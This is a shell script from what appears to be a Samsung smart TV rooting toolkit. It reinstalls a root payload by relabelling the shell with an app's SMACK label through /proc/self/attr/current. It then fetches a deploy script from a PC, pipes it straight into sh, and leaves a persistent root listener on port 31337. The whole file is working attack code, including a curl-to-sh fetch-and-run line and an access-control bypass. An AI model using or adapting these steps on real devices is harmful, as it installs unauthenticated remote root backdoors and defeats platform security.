#!/bin/sh
# recover.sh - reinstall the root payload on a TV whose payload was removed.
#
# Run this FROM A ROOT SHELL ON THE TV, not on the PC. Get that shell with
# `python tools/tv_rootwatch.py` (it sends op 5 and leaves a shell on
# 127.0.0.1:9999), then paste:
#
#     curl -s http://<pc-ip>/recover.sh | sh
#
# Why a script: the app's bin/ is only writable while the process carries the
# app's own SMACK label, and a root shell can take that label directly by writing
# /proc/self/attr/current (works with root + full caps). The app directory is
# `User::Home` transmute=TRUE, so the files we create while carrying that label
# inherit it and the app can read them.
#
# Then deploy.sh stops+starts the app so the new DLL loads, and the payload roots
# itself and listens on 31337 (~40 s after any boot, with no PC involved).

# Where is the PC? An explicit argument wins, then the address the last deploy
# recorded on the TV, otherwise refuse rather than guess (a wrong IP just hangs).
H="${1:-}"
if [ -z "$H" ] && [ -f /opt/usr/home/owner/share/rootchan.host ]; then
  host=$(cat /opt/usr/home/owner/share/rootchan.host 2>/dev/null | head -n1)
  [ -n "$host" ] && H="http://$host"
fi
if [ -z "$H" ]; then
  echo "RECOVER=fail - pass the PC address: sh recover.sh http://<pc-ip>"
  exit 1
fi
case "$H" in http://*|https://*) ;; *) H="http://$H" ;; esac
H=${H%/}
APPID=com.samsung.tv.MultiControl-Service
LABEL="User::Pkg::$APPID"

echo "uid=$(id -u)"
if [ "$(id -u)" != "0" ]; then
  echo "RECOVER=fail (need root; run tools/tv_rootwatch.py first)"
  exit 1
fi

echo -n "$LABEL" > /proc/self/attr/current
if [ "$(cat /proc/self/attr/current)" != "$LABEL" ]; then
  echo "RELABEL=fail"
  exit 1
fi
echo "RELABEL=ok ($LABEL)"

# the app must be running for its label to be meaningful, and so that the
# stop+start in deploy.sh has something to restart
aulctl is-active "$APPID" 2>/dev/null

# Prefer the copy root.ps1 already rewrote.  The plain deploy.sh as served still
# carries H="http://HOST_IP" (only root.ps1 rewrites it, into deploy_local.sh), so
# fetching that one blind ended in CURL_FAIL and still printed RECOVER_DONE.
SCRIPT=$(curl -fsS "$H/deploy_local.sh" 2>/dev/null)
if [ -z "$SCRIPT" ]; then
  SCRIPT=$(curl -fsS "$H/deploy.sh" 2>/dev/null)
  if [ -z "$SCRIPT" ]; then
    echo "RECOVER=fail (cannot fetch $H/deploy.sh - is the PC server up?)"
    exit 1
  fi
  SCRIPT=$(printf '%s\n' "$SCRIPT" | sed "s|^H=.*|H=\"$H\"|")
  echo "RECOVER=deploy.sh (host rewritten to $H)"
else
  echo "RECOVER=deploy_local.sh"
fi

printf '%s\n' "$SCRIPT" | sh > /tmp/recover.out 2>&1
STATUS=$?
cat /tmp/recover.out
if [ "$STATUS" -ne 0 ] || ! grep -q DEPLOY_DONE /tmp/recover.out; then
  echo "RECOVER=fail (deploy failed; see above)"
  exit 1
fi
echo "RECOVER_DONE"
echo "verify from the PC:  python tools/root_shell.py \"id\" <tv-ip>"
